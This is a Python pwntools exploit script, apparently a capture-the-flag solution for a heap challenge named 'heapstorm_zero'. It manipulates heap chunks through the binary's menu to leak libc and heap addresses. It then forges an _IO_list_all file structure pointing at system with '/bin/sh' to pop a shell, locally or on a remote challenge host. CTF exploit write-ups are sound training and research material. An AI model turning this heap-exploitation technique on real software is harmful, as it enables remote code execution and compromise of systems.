#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./heapstorm_zero"
os.environ["LD_LIBRARY_PATH"]="/dbg64/lib/"
elf=ELF(pwn_file)
libc = elf.libc
#libc=ELF("./libc.so.6")
heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(size,cont):
    r.sendlineafter("Choice:","1")
    r.sendlineafter("size:",str(size))
    if len(cont) >= size:
        r.sendafter("content:",cont)
    else:
        r.sendlineafter("content:",cont)

def show(idx):
    r.sendlineafter("Choice:","2")
    r.sendlineafter("index:",str(idx))
    r.recvuntil("Content: ")
    return r.recvline()[:-1]

def free(idx):
    r.sendlineafter("Choice:","3")
    r.sendlineafter("index:",str(idx))

def cons():
    r.sendlineafter("Choice:","1"*0x500)

for i in range(14):
    add(0x38,"b")

for i in range(2,8):
    free(i)

cons()
add(0x38,"a"*0x38)#2
add(0x38,"a"*0x30)#3
add(0x38,"a"*0x30)#4
free(3)
cons()
free(8)
add(0x38,"a"*0x20+p64(0xffffffffff600400-0x18))
free(3)
cons()
add(0x38,"a"*0x30)#3
add(0x38,"a"*0x30)#5
add(0x38,"a"*0x30)#6
libc.address = u64(show(4).ljust(8,"\x00")) - libc.sym["__malloc_hook"] - 0x68
add(0x38,"a"*0x30)#7
free(5)
free(7)
heap_add = u64(show(4).ljust(8,"\x00"))-0x180

free(9)
add(0x38,"a"*0x18+p64(heap_add+0x260)+p64(0)+p64(libc.sym["system"]))#5

add(0x38,"a"*0x30)#7
add(0x38,"a"*0x30)#9
add(0x18,"a"*0x10)#14
free(8)#15
add(0x28,"a"*0x18+p64(0x41))
add(0x38,"/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc.sym["_IO_list_all"]-0x10))
r.sendlineafter("Choice:","1")
r.sendlineafter("size:","1")
r.interactive()




